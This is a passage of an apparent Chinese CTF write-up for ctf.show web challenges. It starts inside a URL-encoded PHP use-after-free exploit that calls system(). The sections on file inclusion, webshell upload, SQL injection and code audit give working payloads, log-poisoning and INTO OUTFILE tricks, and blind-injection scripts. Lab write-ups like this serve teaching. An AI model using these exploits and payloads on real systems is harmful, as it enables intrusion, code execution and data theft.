0%24base%20%2b%20%24p_vaddr%3b%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24data_size%20%3d%20%24p_memsz%3b%20%20%20%20%20%20%20%20%20%20%20%20%20%7d%20else%20if(%24p_type%20%3d%3d%201%20%26%26%20%24p_flags%20%3d%3d%205)%20%7b%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24text_size%20%3d%20%24p_memsz%3b%20%20%20%20%20%20%20%20%20%20%20%20%20%7d%20%20%20%20%20%20%20%20%20%7d%20%20%20%20%20%20%20%20%20%20if(!%24data_addr%20%7c%7c%20!%24text_size%20%7c%7c%20!%24data_size)%20%20%20%20%20%20%20%20%20%20%20%20%20return%20false%3b%20%20%20%20%20%20%20%20%20%20return%20%5b%24data_addr%2c%20%24text_size%2c%20%24data_size%5d%3b%20%20%20%20%20%7d%20%20%20%20%20%20function%20get_basic_funcs(%24base%2c%20%24elf)%20%7b%20%20%20%20%20%20%20%20%20list(%24data_addr%2c%20%24text_size%2c%20%24data_size)%20%3d%20%24elf%3b%20%20%20%20%20%20%20%20%20for(%24i%20%3d%200%3b%20%24i%20%3c%20%24data_size%20%2f%208%3b%20%24i%2b%2b)%20%7b%20%20%20%20%20%20%20%20%20%20%20%20%20%24leak%20%3d%20leak(%24data_addr%2c%20%24i%20*%208)%3b%20%20%20%20%20%20%20%20%20%20%20%20%20if(%24leak%20-%20%24base%20%3e%200%20%26%26%20%24leak%20-%20%24base%20%3c%20%24data_addr%20-%20%24base)%20%7b%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24deref%20%3d%20leak(%24leak)%3b%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if(%24deref%20!%3d%200x746e6174736e6f63)%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20continue%3b%20%20%20%20%20%20%20%20%20%20%20%20%20%7d%20else%20continue%3b%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24leak%20%3d%20leak(%24data_addr%2c%20(%24i%20%2b%204)%20*%208)%3b%20%20%20%20%20%20%20%20%20%20%20%20%20if(%24leak%20-%20%24base%20%3e%200%20%26%26%20%24leak%20-%20%24base%20%3c%20%24data_addr%20-%20%24base)%20%7b%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24deref%20%3d%20leak(%24leak)%3b%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if(%24deref%20!%3d%200x786568326e6962)%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20continue%3b%20%20%20%20%20%20%20%20%20%20%20%20%20%7d%20else%20continue%3b%20%20%20%20%20%20%20%20%20%20%20%20%20%20return%20%24data_addr%20%2b%20%24i%20*%208%3b%20%20%20%20%20%20%20%20%20%7d%20%20%20%20%20%7d%20%20%20%20%20%20function%20get_binary_base(%24binary_leak)%20%7b%20%20%20%20%20%20%20%20%20%24base%20%3d%200%3b%20%20%20%20%20%20%20%20%20%24start%20%3d%20%24binary_leak%20%26%200xfffffffffffff000%3b%20%20%20%20%20%20%20%20%20for(%24i%20%3d%200%3b%20%24i%20%3c%200x1000%3b%20%24i%2b%2b)%20%7b%20%20%20%20%20%20%20%20%20%20%20%20%20%24addr%20%3d%20%24start%20-%200x1000%20*%20%24i%3b%20%20%20%20%20%20%20%20%20%20%20%20%20%24leak%20%3d%20leak(%24addr%2c%200%2c%207)%3b%20%20%20%20%20%20%20%20%20%20%20%20%20if(%24leak%20%3d%3d%200x10102464c457f)%20%7b%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20return%20%24addr%3b%20%20%20%20%20%20%20%20%20%20%20%20%20%7d%20%20%20%20%20%20%20%20%20%7d%20%20%20%20%20%7d%20%20%20%20%20%20function%20get_system(%24basic_funcs)%20%7b%20%20%20%20%20%20%20%20%20%24addr%20%3d%20%24basic_funcs%3b%20%20%20%20%20%20%20%20%20do%20%7b%20%20%20%20%20%20%20%20%20%20%20%20%20%24f_entry%20%3d%20leak(%24addr)%3b%20%20%20%20%20%20%20%20%20%20%20%20%20%24f_name%20%3d%20leak(%24f_entry%2c%200%2c%206)%3b%20%20%20%20%20%20%20%20%20%20%20%20%20%20if(%24f_name%20%3d%3d%200x6d6574737973)%20%7b%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20return%20leak(%24addr%20%2b%208)%3b%20%20%20%20%20%20%20%20%20%20%20%20%20%7d%20%20%20%20%20%20%20%20%20%20%20%20%20%24addr%20%2b%3d%200x20%3b%20%20%20%20%20%20%20%20%20%7d%20while(%24f_entry%20!%3d%200)%3b%20%20%20%20%20%20%20%20%20return%20false%3b%20%20%20%20%20%7d%20%20%20%20%20%20function%20trigger_uaf(%24arg)%20%7b%20%20%20%20%20%20%20%20%20%20%24arg%20%3d%20str_shuffle('aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa')%3b%20%20%20%20%20%20%20%20%20%24vuln%20%3d%20new%20vuln()%3b%20%20%20%20%20%20%20%20%20%24vuln-%3ea%20%3d%20%24arg%3b%20%20%20%20%20%7d%20%20%20%20%20%20if(stristr(php_os%2c%20'win'))%20%7b%20%20%20%20%20%20%20%20%20die('this%20poc%20is%20for%20*nix%20systems%20only.')%3b%20%20%20%20%20%7d%20%20%20%20%20%20%24n_alloc%20%3d%2010%3b%20%20%20%20%20%20%24contiguous%20%3d%20%5b%5d%3b%20%20%20%20%20for(%24i%20%3d%200%3b%20%24i%20%3c%20%24n_alloc%3b%20%24i%2b%2b)%20%20%20%20%20%20%20%20%20%24contiguous%5b%5d%20%3d%20str_shuffle('aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa')%3b%20%20%20%20%20%20trigger_uaf('x')%3b%20%20%20%20%20%24abc%20%3d%20%24backtrace%5b1%5d%5b'args'%5d%5b0%5d%3b%20%20%20%20%20%20%24helper%20%3d%20new%20helper%3b%20%20%20%20%20%24helper-%3eb%20%3d%20function%20(%24x)%20%7b%20%7d%3b%20%20%20%20%20%20if(strlen(%24abc)%20%3d%3d%2079%20%7c%7c%20strlen(%24abc)%20%3d%3d%200)%20%7b%20%20%20%20%20%20%20%20%20die(%22uaf%20failed%22)%3b%20%20%20%20%20%7d%20%20%20%20%20%20%24closure_handlers%20%3d%20str2ptr(%24abc%2c%200)%3b%20%20%20%20%20%24php_heap%20%3d%20str2ptr(%24abc%2c%200x58)%3b%20%20%20%20%20%24abc_addr%20%3d%20%24php_heap%20-%200xc8%3b%20%20%20%20%20%20write(%24abc%2c%200x60%2c%202)%3b%20%20%20%20%20write(%24abc%2c%200x70%2c%206)%3b%20%20%20%20%20%20write(%24abc%2c%200x10%2c%20%24abc_addr%20%2b%200x60)%3b%20%20%20%20%20write(%24abc%2c%200x18%2c%200xa)%3b%20%20%20%20%20%20%24closure_obj%20%3d%20str2ptr(%24abc%2c%200x20)%3b%20%20%20%20%20%20%24binary_leak%20%3d%20leak(%24closure_handlers%2c%208)%3b%20%20%20%20%20if(!(%24base%20%3d%20get_binary_base(%24binary_leak)))%20%7b%20%20%20%20%20%20%20%20%20die(%22couldn't%20determine%20binary%20base%20address%22)%3b%20%20%20%20%20%7d%20%20%20%20%20%20if(!(%24elf%20%3d%20parse_elf(%24base)))%20%7b%20%20%20%20%20%20%20%20%20die(%22couldn't%20parse%20elf%20header%22)%3b%20%20%20%20%20%7d%20%20%20%20%20%20if(!(%24basic_funcs%20%3d%20get_basic_funcs(%24base%2c%20%24elf)))%20%7b%20%20%20%20%20%20%20%20%20die(%22couldn't%20get%20basic_functions%20address%22)%3b%20%20%20%20%20%7d%20%20%20%20%20%20if(!(%24zif_system%20%3d%20get_system(%24basic_funcs)))%20%7b%20%20%20%20%20%20%20%20%20die(%22couldn't%20get%20zif_system%20address%22)%3b%20%20%20%20%20%7d%20%20%20%20%20%20%20%24fake_obj_offset%20%3d%200xd0%3b%20%20%20%20%20for(%24i%20%3d%200%3b%20%24i%20%3c%200x110%3b%20%24i%20%2b%3d%208)%20%7b%20%20%20%20%20%20%20%20%20write(%24abc%2c%20%24fake_obj_offset%20%2b%20%24i%2c%20leak(%24closure_obj%2c%20%24i))%3b%20%20%20%20%20%7d%20%20%20%20%20%20write(%24abc%2c%200x20%2c%20%24abc_addr%20%2b%20%24fake_obj_offset)%3b%20%20%20%20%20write(%24abc%2c%200xd0%20%2b%200x38%2c%201%2c%204)%3b%20%20%20%20%20%20write(%24abc%2c%200xd0%20%2b%200x68%2c%20%24zif_system)%3b%20%20%20%20%20%20%20(%24helper-%3eb)(%24cmd)%3b%20%20%20%20%20exit()%3b%20%7d%20%20ctfshow(%22cat%20%2fflag0.txt%22)%3bexit()%3b%20%3f%3e
```



### web75

还是一样通过glob协议找到文件为flag36.txt，但是include限制文件夹，之前的uaf poc因为strlen被禁了获取不到system地址也没法用了，但是既然php受限制，那么mysql的load_file函数呢?

payload:

```
c=try {$dbh = new PDO('mysql:host=localhost;dbname=ctftraining', 'root',
'root');foreach($dbh->query('select load_file("/flag36.txt")') as $row)
{echo($row[0])."|"; }$dbh = null;}catch (PDOException $e) {echo $e-
>getMessage();exit(0);}exit(0);
```



```
try {
	# 创建 PDO 实例, 连接 MySQL 数据库
	$dbh = new PDO('mysql:host=localhost;dbname=ctftraining', 'root', 'root');
	
	# 在 MySQL 中，load_file(完整路径) 函数读取一个文件并将其内容作为字符串返回。
	foreach($dbh->query('select load_file("/flag36.txt")') as $row) {
		echo($row[0])."|";
	}
	
	$dbh = null;
}

catch (PDOException $e) {
	echo $e->getMessage();exit(0);
}

exit(0);

```



### web77

use the glob://

```
c=?><?php $a=new DirectoryIterator("glob:///*");foreach($a as $f){echo($f->__toString().' ');} exit(0);?>
```

flag在flag36x.txt中，准备读取。

c=$a='/flag36x > 1.txt';exit();



## 文件包含

文件包含系列开始

### web78

网站源码为：

```
<?php



if(isset($_GET['file'])){
    $file = $_GET['file'];
    include($file);
}else{
    highlight_file(__FILE__);
}
```

没有任何的过滤

可见对于一个名为“file”的GET请求，会以include的形式去执行，那这个地方尝试使用php伪协议

payload：?file=php://filter/convert.base64-encode/resource=flag.php

再一次获得flag.php的base64编码

解码即可得到flag



### web79

这一次出现了过滤，会将php自动转换为 ???从而使php伪协议失效

换别的协议吧，比如说data://,file://。

```
<?php



if(isset($_GET['file'])){
    $file = $_GET['file'];
    $file = str_replace("php", "???", $file);
    include($file);
}else{
    highlight_file(__FILE__);
}
```

构造payload:?file=data://text/plain,<?=system('tac flag*');?>

原理：利用data协议直接让其执行命令。



### web80

这一次的过滤有php和data，那就只能用别的伪协议了，压缩的那几个肯定不用了。那只剩一个file了。

但是**file只能够读取本地文件**，我要它有何用啊？

说明这里根本就不是绕过关键词，而是绕过过滤。

思路，更改大小写来绕过。

```
<?php

if(isset($_GET['file'])){
  $file = $_GET['file'];
  $file = str_replace("php", "???", $file);
  $file = str_replace("data", "???", $file);
  include($file);
}else{
  highlight_file(__FILE__);
}
```

payload:?file=PHP://input,然后需要构建POST请求。此处使用到BurpSuite，

构建<?php system("ls");?>输入即可得到文件遍历目录。

这个网站里面有fl0g.php index.php两个文件，当然我们不能直接访问得到。

那就再来一次。

payload:?file=PHP://input，POST：<? php system("tac f*");?>

这次得到了flag



### web81

吊毛，这次把冒号过滤掉了，那就用url编码%3A代替。

```
<?php

if(isset($_GET['file'])){
  $file = $_GET['file'];
  $file = str_replace("php", "???", $file);
  $file = str_replace("data", "???", $file);
  $file = str_replace(":", "???", $file);
  include($file);
}else{
  highlight_file(__FILE__);
}
```

payload:?file=PHP%3A//input,POST:<?php system("ls");?>

然后冒号被过滤了……说明php://input失效了

但还有日志可以用，?file=/var/log/nginx/access.log，发现它读取了很多的UA

那就在UA里面做手脚。抓包，UA插一句话木马，然后对着这个文件用AntSword，刀它！

在/var/www/html/fl0g.php中发现了flag

![](.\文件包含\图片\web81.png)



### web82

文件包含

**竞争环境需要晚上11点30分至次日7时30分之间做，其他时间不开放竞争条件**

嗯？竞争环境？

```
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-16 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-16 19:34:45
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/


if(isset($_GET['file'])){
    $file = $_GET['file'];
    $file = str_replace("php", "???", $file);
    $file = str_replace("data", "???", $file);
    $file = str_replace(":", "???", $file);
    $file = str_replace(".", "???", $file);
    include($file);
}else{
    highlight_file(__FILE__);
}
```

好吧，php和data被锁了，冒号和点号被封了。这下后门都上不了了。

根据题目提示，使用PHP_SESSION_UPLOAD_PROGRESS加条件竞争进行文件包含。

然而这题得熬夜做……今天就算了。







## php特性



## 文件上传

### web151

前台校验不可靠

那就改前端，按F12打开控制台。找到前端检查文件格式的地方，发现可以更改例外情况，那就把png改为php，上传一句话木马，然后AntSword连接即可。

![前端弱点](.\文件上传\web151\找到前端弱点.png)

在/var/www/html中找到flag.php，打开它得到flag。

![发现flag](.\文件上传\web151\得到flag.png)



### web152

后端不能单一校验

开局和web151一样的操作，先改前端使其能够上传php文件，然后发现它拒绝了，看来文件类型被人发现不对头了。

加个头试试？还是不合规。

那改变文件类型试试？想多了，文件类型改了就失效了。

看来必须得上传一个图片。

使用bp抓包，先将一句话木马改为png格式成功上传，抓包成功后然后修改回php的后缀解析在放包。

AntSword连接，成功

在/var/www/html里面找到了藏有flag的flag.php文件

![web152](.\文件上传\web152.png)



### web153（未完成）





## SQL注入

> 手动注入基本步骤：所有语句末尾接%23
>
> 1. 查询闭合条件:  空格/单引号/两个单引号…… ，测试到再度正常为止
> 2. 测试字段数：闭合 order by，查到异常到再度正常为止
> 3. 查回显字段：闭合 union select 所有段 查看结果
> 4. 爆库名：回显字段替换为database()
> 5. 爆表名：回显字段替换为group_concat(schema_name)，末尾接上from information_schema.schemata
> 6. 爆字段：回显字段替换为group_concat(table_name)，末尾接上from information_schema.tables where table_schema=database()
> 7. 爆对应字段的所有列的值：回显字段替换为group_concat(column_name),末尾接上 from information_schema.columns where table_name='字段名'
> 8. 爆对应列的对应值：回显字段替换为group_concat(所有想要的列)，末尾接上from 对应字段
>
> 

### web171

使用sqlmap是没有灵魂的，你在内涵谁？

等会儿就去Github上学习sqlmap的源代码，学会了再用这个，就有灵魂了（乐）。

```
//拼接sql语句查找指定ID用户
$sql = "select username,password from user where username !='flag' and id = '".$_GET['id']."' limit 1;";
```

入门的sql注入 这道题目其实就是最简单的sql注入的例子，这里会把输入的id以get的形式直接递交到后台和查询语句进行简单的字符串拼接的过程，同时根据这个题目的查询条件，可以猜测username为为flag的用户他的信息就是我们所需要的。

但是网页里所展示的24个用户并没有我们所需要的flag

这里主要的思路就是**用or进行截断，然后or后面跟我们所需要查询的语句**

'我们传入的语句'

首先我们给前面一个查询语句一个不可能达成的条件去截断它，即**-1'**

然后用or加上我们所要查询的 or username = 'flag'.我们语句外面还有一个引号。所以我们不要最后一个引号

最后的语句就是这样 -1' or username = 'flag

![](.\SQL注入\web171.png)

尝试使用sqlmap解决此题：

```
sqlmap -u "http://cde6efe9-40f8-430c-9698-5cdac62609b6.challenge.ctf.show/?id=1" --dbs --batch
```

想多了，别人把GET请求隔离了，专门防CSRF攻击的。



### web172

撸猫为主，要什么flag？

我就要！

进入环境，查看页面源码，发现select.js

看到查询时的url是/api/?id=

![](.\SQL注入\web172\完成注入.png)

先上手动注入流程：

1. 查看页面源码，发现select.js

   看到查询时的url是/api/?id=

   /api/?id=1' order by 3%23

   /api/?id=1' union select 1,2,3%23

   /api/?id=1' union select 1,2,database()%23

   联合查询

   /api/?id=1' union select 1,(select group_concat(schema_name) from information_schema.schemata),database()%23

   /api/?id=1' union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='ctfshow_web'),database()%23

   /api/?id=1' union select 1,(select group_concat(column_name) from information_schema.columns where table_schema='ctfshow_web' and table_name='ctfshow_user'),database()%23

   看到有3列 id,username,password

   /api/?id=1' union select 1,(select group_concat(password) from ctfshow_web.ctfshow_user),database()%23

   查询password发现没有flag

   查另一个表 ctfshow_user2

   /api/?id=1' union select 1,(select group_concat(password) from ctfshow_web.ctfshow_user2),database()%23

   看到flag

   ![](.\SQL注入\web172\完成注入.png)



### web173

考查sql基础

api/?id= 还是一如既往，开始手动注入

1. 闭合为1’
2. order by 检查有3段
3. 三段均可显示，nice
4. 数据库名：ctfshow_web
5. 表名：information_schema,test,mysql,performance_schema,ctfshow_web
6. ctfshow_web列名：ctfshow_user,ctfshow_user2,ctfshow_user3
7. ctfshow_user行名：没有
8. ctfshow_user2行名：没有
9. ctfshow_user3行名：id,username,password
10. ?id=1' union select id,username,password from ctfshow_user3%23，得到ctfshow{48d10635-f753-4e3a-bd14-b11b924dc67c}

![](.\SQL注入\web173.png)

### web174

本题过滤了一切带有数字的值回显出来，那就只能使用replace()语法将数字全部转换成字母来进行注入了

```
0' union select 'a',replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(to_base64(password),"1","@A"),"2","@B"),"3","@C"),"4","@D"),"5","@E"),"6","@F"),"7","@G"),"8","@H"),"9","@I"),"0","@J") from ctfshow_user4 where username="flag" --+
```

但是，这样子会让flag也变成加密形式，因此需要写脚本还原

```
import base64

flag64 = "Y@CRmc@Bhvd@Cs@JYzcxYjRjYy@AmMjZkLTQ@BYjctYmU@JZS@AjYTMwMmFjZWU@EODZ@I"
flag = flag64.replace("@A", "1").replace("@B", "2").replace("@C", "3").replace("@D", "4").replace("@E", "5").replace(
    "@F", "6").replace("@G", "7").replace("@H", "8").replace("@I", "9").replace("@J", "0")

print(base64.b64decode(flag))
```

最后解码得到flag的值

![](.\SQL注入\web174\web174.png)



### web175

虽然正则匹配过滤了所有ASCII值的回显，但这并不意味着注入点不能看，毕竟无显示和异常还是有区别的。

然后关于不回显的事情，将内容输出到别的文件里访问就是了。

1. 测试发现1‘ 即可闭合代码
2. 经过order by测试，这次的数据库只有两段
3. 这都不需要测试回显了，就两行，图中有三行，怎么都显示。
4. 由于不回显，我们只能将其输出到另外的文件中查看，构造payload:1' union select 1,password from ctfshow_user5 into outfile '/var/www/html/1.txt'%23，也就是将查询的结果输出到/var/www/html/1.txt的文件中，待会儿我们访问便是。

这不就找到了吗？

![](.\SQL注入\web175.png)

### web176

从现在开始，有字符过滤了，开始学习绕过姿势。

过滤了`select`，通过大小写即可绕过 。order by检查有3行，那就开始吧。

直接构造payload:1' union SELect 1,2,3%23，很好三段均回显。

根据题目所给提示，直接

```
1' union sElect id,username,password from ctfshow_user%23
```

拿到flag

![](.\SQL注入\web176.png)

另解：万能密码'1 or 1=1%23



### web177

这次过滤了空格，/**/或者%09绕过即可。

order by试探了下只有三行，继续union select。

很好，这次没有过滤select。

那就直接把1，2，3换成id,username,password，最后接上%09from%09ctfshow_user%23

成功拿到flag。

![](.\SQL注入\web177.png)

p.s:尝试1‘%9or%091=1%23，失败……



### web178

过滤了空格和*号。

用%09绕过即可

```
1'%09union%09select%09id,username,password%09from%09ctfshow_user%23
```

完事，得到flag

再试试这个也可以

```
id=1'or'1'='1'%23
```

![](.\SQL注入\web178.png)

### web179

它这次把%09绕过了，那就用%0c代替

```
1'%0cunion%0cselect%0cid,username,password%0cfrom%0cctfshow_user%23
```

后面基本过程相似，就不放图了。

万能密码'or'1'='1'%23依旧坚挺，下道题试试看。

### web180

这次过滤了%09,%0a,%0b,%0d，用%0c绕过

通过测试发现注释符被过滤了，即–+，#，%23都不可以使用，我们换一种思路，把sql后面的‘闭合。

```
'or'1'='1'--%0c
```

或者

```
-1'%0cor%0cusername%0clike%0c'flag
```



### web181

```
  function waf($str){
    return preg_match('/ |\*|\x09|\x0a|\x0b|\x0c|\x00|\x0d|\xa0|\x23|\#|file|into|select/i', $str);
  }
```

这次过滤了空格

payload:-1'%0cor%0cusername='flag



### web182

```
//对传入的参数进行了过滤
  function waf($str){
    return preg_match('/ |\*|\x09|\x0a|\x0b|\x0c|\x00|\x0d|\xa0|\x23|\#|file|into|select|flag/i', $str);
  }
```

不许直接访问flag

payload:-1'%0cor%0cusername%0clike%0c'f%%%



### web183

```
  function waf($str){
    return preg_match('/ |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\#|\x23|file|\=|or|\x7c|select|and|flag|into/i', $str);
  }
```

不允许select or and flag into =

用like+正则 

tableName=`ctfshow_user`where`pass`like'%25c%25'，直接POST上去。

然后，使用盲注脚本：

```
import requests

url = 'http://59418fd8-bd5f-4fd3-bc04-9997ef8ac8e4.challenge.ctf.show/select-waf.php'

flagstr = '1234567890asdfghjklqwertyuiopzxcvbnm-_{}'
flag = 'ctfshow{'

for i in range(50):
    for x in flagstr:
        data = {
            'tableName': f"`ctfshow_user`where`pass`regexp'{flag + x}'"
        }
        res = requests.post(url=url, data=data)
        if res.text.find('user_count = 1;') > 0:
            flag += x
            print('++++++++++++++++++++++++right:   ' + x)
            break
        else:
            print('+++++++++++++++++wrong:  ' + x)
    print(flag)

```

运行即可发现flag的值会一点一点拼出来，直到括号闭合成功后即可停止脚本执行提交flag。



### web184

```
  function waf($str){
    return preg_match('/\*|\x09|\x0a|\x0b|\x0c|\0x0d|\xa0|\x00|\#|\x23|file|\=|or|\x7c|select|and|flag|into|where|\x26|\'|\"|union|\`|sleep|benchmark/i', $str);
  }
```

这题过滤了where，‘ ，",*,等符号，目的是使用左右连接查询进行注入。

已知条件：flag格式：ctfshow{ 这个字符开头。

好多wp和官方视频没有解释为什么要使用$user_count=43,来做判断条件，基本不好的小白就很难受了。

payload: tableName= ctfshow_user as a left join ctfshow_user as b on a.pass regexp([CONCAT](https://so.csdn.net/so/search?q=CONCAT&spm=1001.2101.3001.7020)(char(99),char(116),char(42)) ) 

$user_count=43. 这里根据返回结果43，就可以判断我们的payload是执行正确的，精确操作了数据表中带flag值的行：具体可以分析一下我们的payload。

又得盲注了，

```
import requests
import sys

url = 'http://74cb8d43-be70-4911-becb-97bc98d25e45.challenge.ctf.show/select-waf.php'
flag = 'ctfshow{'
letter = "0123456789abcdefghijklmnopqrstuvwxyz-{}"

def asc2hex(s):
    a1 = ''
    a2 = ''
    for i in s:
        a1+=hex(ord(i))
    a2 = a1.replace("0x","")
    return a2
for i in range(100):
    for j in letter:
        payload = {
            "tableName":"ctfshow_user group by pass having pass like {}".format("0x"+asc2hex(flag+j+"%"))
        }
        r = requests.post(url=url,data=payload).text
        if "$user_count = 1;" in r:
            flag+=j
            print(flag)
            break
            if j == "}":
                sys.exit()

```

![](.\SQL注入\web184\web184.png)



### web185-186

```
  function waf($str){
    return preg_match('/\*|\x09|\x0a|\x0b|\x0c|\0x0d|\xa0|\x00|\#|\x23|[0-9]|file|\=|or|\x7c|select|and|flag|into|where|\x26|\'|\"|union|\`|sleep|benchmark/i', $str);
  }
```

数字被过滤了，需要构造。

```
import requests
import sys

def createNum(n):
    num = "true"
    if n == 1:
        return "true"
    else:
        for i in range(n - 1):
            num += "+true"
    return num


def createstrNum(m):
    _str = ""
    for j in m:
        _str += ",chr(" + createNum(ord(j)) + ")"
    return _str[1:]


url = "http://33db22fa-e601-49f4-a311-7ba9a21a915c.challenge.ctf.show/select-waf.php"
letter = "0123456789abcdefghijklmnopqrstuvwxyz-{}"
flag = "ctfshow{"
for i in range(100):
    for j in letter:
        data = {
            'tableName': 'ctfshow_user group by pass having pass like concat({})'.format(createstrNum(flag + j + "%"))
        }
        res = requests.post(url=url, data=data).text
        # print(res)
        if "$user_count = 1;" in res:
            flag += j
            print(flag)
            break
        if j == "}":
            sys.exit()

```

![](.\SQL注入\web185-186\web185.png)

![](.\SQL注入\web185-186\web186.png)



### web187

```
    $username = $_POST['username'];
    $password = md5($_POST['password'],true);

    //只有admin可以获得flag
    if($username!='admin'){
        $ret['msg']='用户名不存在';
        die(json_encode($ret));
    }
```

POST上username且必须为admin，password有md5检验。

注意到md5(string,true)这个函数

md5(string,raw)其中raw参数可选，且有两种选择

FALSE：32位16进制的字符串
TRUE：16位原始二进制格式的字符串
当有true这个参数，会以二进制的形式输出16个字符。返回的这个原始二进制不是普通的0 1二进制。

> 在mysql里面，在用作布尔型判断时，以1开头的字符串会被当做整型数。要注意的是这种情况是必须要有单引号括起来的，比如password=‘xxx’ or ‘1xxxxxxxxx’，那么就相当于password=‘xxx’ or 1 ，也就相当于password=‘xxx’ or true，所以返回值就是true。当然在我后来测试中发现，不只是1开头，只要是数字开头都是可以的。
> 当然如果只有数字的话，就不需要单引号，比如password=‘xxx’ or 1，那么返回值也是true。（xxx指代任意字符）

```
import requests

url = 'http://ba40e41c-7293-4031-bc46-860fbc112f03.challenge.ctf.show/select-waf.php'
url2 = ' http://ba40e41c-7293-4031-bc46-860fbc112f03.challenge.ctf.show/api/'

payload = {
    "username":"admin",
    "password":"ffifdyop"
}

#r = requests.post(url=url,data=payload)
res = requests.post(url=url2,data=payload).text

print(res)

```

![](.\SQL注入\web187\web187.png)

### web188

```
  //用户名检测
  if(preg_match('/and|or|select|from|where|union|join|sleep|benchmark|,|\(|\)|\'|\"/i', $username)){
    $ret['msg']='用户名非法';
    die(json_encode($ret));
  }

  //密码检测
  if(!is_numeric($password)){
    $ret['msg']='密码只能为数字';
    die(json_encode($ret));
  }

  //密码判断
  if($row['pass']==intval($password)){
      $ret['msg']='登陆成功';
      array_push($ret['data'], array('flag'=>$flag));
    }
      
```

mysql中字母与数字的比较过程：

以字母为开头的字符型数据在与数字型比较时，会强制转化为0，再与数字比较（这里很类似于PHP的弱比较）
假设我们username为0，那么就会相等，从而匹配成功

在这里的password是用0来混字母开头的$row['pass']

```
import requests

url = 'http://106c7788-8a93-4a71-ab55-e09f7ecddca2.challenge.ctf.show/api/'

payload = {
    "username":"0",
    "password":"0"
}

res = requests.post(url=url,data=payload).text

print(res)

```

![](.\SQL注入\web188\web188.png)

通过检测后，waf直接给了flag



### web189

```
flag在api/index.php文件中
```

```
import requests
import sys
import json

url = 'http://c1f50290-9488-499d-b94a-01abe27e29c0.challenge.ctf.show/api/index.php'
flag = 'ctfshow{'
letter = '0123456789abcdefghijklmnopqrstuvwxyz-{}'

for i in range(100):
    for j in letter:
        payload = {
            "username": "if(load_file('/var/www/html/api/index.php')regexp('{}'),0,1)".format(flag + j),
            "password": "0"

        }
        r = requests.post(url=url,data=payload)
        #print(r)
        if "密码错误" == r.json()['msg']:
            flag += j
            print(flag)
            break
        if '}' in flag:
            sys.exit()

```



![](.\SQL注入\web189\web189.png)





## 代码审计

### web301

审计代码，首先打开靶机，发现了一个后台登录界面。

面对登录，可能的思路为弱口令（一般CTF题）和SQL注入（某私有云数据中心）

> 但是，弱口令一般都不会是首选，除非对方明确告诉你了可能要爆破。
>
> 原因如下：
>
> - 容器分配的资源有限，可能经不住过高速率的爆破，但如果出题人不提示，那就不是解题人的错。
> - 爆破本身可以算对服务器的DOS攻击，任由他人爆破可能会造成潜在不良后果。

打开源码文件，发现sql数据库。

好吧，这下就锁死是SQL注入了。

先看login.php这个我们一打开靶机就会看到的。

根据代码：

```html
<form class="am-form" action="checklogin.php" method="post" >
```

寻找checklogin.php，从

```php
require 'conn.php';
```

打开conn.php，发现是后端数据库的登录信息，但很遗憾，密码是不可见的。

![第一步有些出师不利](.\代码审计\web301\数据库关键信息不明.png)

回到checklogin.php，可以看到文件中写明了

```php
$sql="select sds_password from sds_user where sds_username='".$username."' order by id limit 1;";
```

说明只用查一列，而且接下来的代码显示如果没有查询结果或结果不匹配，则返回错误。

操作对象： username

从手动注入开始过一遍流程：

1. 确认只有一列，那就用union select 1
2. 为了让前方代码闭合，最前面加个‘， 变成 ‘ union select 1
3. 为了确保能够正确执行，结尾加个 # 注释后面内容

故得到payload:

```
username: ' union select 1 #
password: 1  // 和上面的1对应
```

进入后台，得到flag

![成功](.\代码审计\web301\登录成功.png)

### web302

修改的地方：

```
if(!strcasecmp(sds_decode($userpwd),$row['sds_password']))
```

也就是userpwd这个属性被加密了，先输入加密的结果，password是明文。

寻找一下，在fun.php中找到了加密函数

```php
<?php
function sds_decode($str){
	return md5(md5($str.md5(base64_encode("sds")))."sds");
}
?>
```

稍做修改

```php
<?php
	$str = 1;
	echo md5(md5($str.md5(base64_encode("sds")))."sds");
?>
```

得到结果为：

```
d9c77c4e454869d5d8da3b4be79694d3
```

重新构建payload:

```
username: ' union select 'd9c77c4e454869d5d8da3b4be79694d3' #
password: 1
```

又进去了

![成功](.\代码审计\web302\flag.png)



### web303

又是数据库，不过这次管理员分出来了。

```php
if(strlen($username)>6){
	die();
}
```

说明username字符不能大于6，这不明摆着写admin吗？

这次给了user数据库，看了一下，就一个user， 序号1， 叫admin，密码加密存着

```sql
INSERT INTO `sds_user` VALUES ('1', 'admin', '27151b7b1ad51a38ea66b1529cde5ee4');
```

这个加密值我就猜admin了，通过本地php环境验证，还真是。

打开靶机先登录，登录身份为管理员，但没找到flag……

那就只能从另一个数据库dpt.sql下手了。

在网页前端操作网点菜单时跳出以下内容：

```sql
insert into sds_dpt set sds_name='',sds_address ='',sds_build_date='',sds_have_safe_card='1',sds_safe_card_num='',sds_telephone='';Incorrect datetime value: '' for column `sds`.`sds_dpt`.`sds_build_date` at row 1
```

那就只能用这个报错信息注入了：

```sql
# dptadd.php中传入参数没有过滤，存在insert注入
$sql="insert into sds_dpt set 
